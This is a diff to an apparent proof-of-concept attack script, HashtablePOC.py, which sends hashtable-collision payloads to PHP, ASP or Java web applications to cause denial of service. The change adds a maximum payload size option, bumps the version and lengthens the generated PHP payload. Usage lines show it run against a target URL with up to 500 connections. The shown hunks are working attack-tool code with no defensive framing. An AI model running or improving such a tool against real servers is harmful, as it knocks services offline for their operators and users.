@@ -20,6 +20,7 @@ python HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output -t PHP
 python HashtablePOC.py -u https://host/index.php -v -c 500 -t PHP
 
 Changelog:
+v5.0: Define max payload size as parameter
 v4.0: Get PHP Collision Chars on the fly
 v3.0: Load Payload from file
 v2.0: Added Support for https, switched to HTTP 1.1
@@ -48,7 +49,8 @@ def main():
     parser.add_argument("-p", "--payload", dest="payload", help="Save payload to file")
     parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
     parser.add_argument("-t", "--target", dest="target", help="Target of the attack", choices=["ASP", "PHP", "JAVA"], required=True)
-    parser.add_argument("--version", action="version", version="%(prog)s 4.0")
+    parser.add_argument("-m", "--max-payload-size", dest="maxpayloadsize", help="Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB", default=8, type=int)
+    parser.add_argument("--version", action="version", version="%(prog)s 5.0")
 
     options = parser.parse_args()
 
@@ -100,6 +102,10 @@ def main():
         payload = f.read()
         f.close()
         print("Loaded Payload from %s" % options.payload)    
+
+    # trim to maximum payload size (in MB)
+    maxinmb = options.maxpayloadsize*1024*1024
+    payload = payload[:maxinmb]
 
     print("Host: %s" % host)
     print("Port: %s" % str(port))
@@ -186,7 +192,7 @@ def generatePHPPayload():
     # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
     # compute entries with collisions in PHP hashtable hash function 
     a = computePHPCollisionChars(5)
-    return _generatePayload(a, 7);
+    return _generatePayload(a, 8);
     
 def _generatePayload(collisionchars, payloadlength):
     # Taken from:
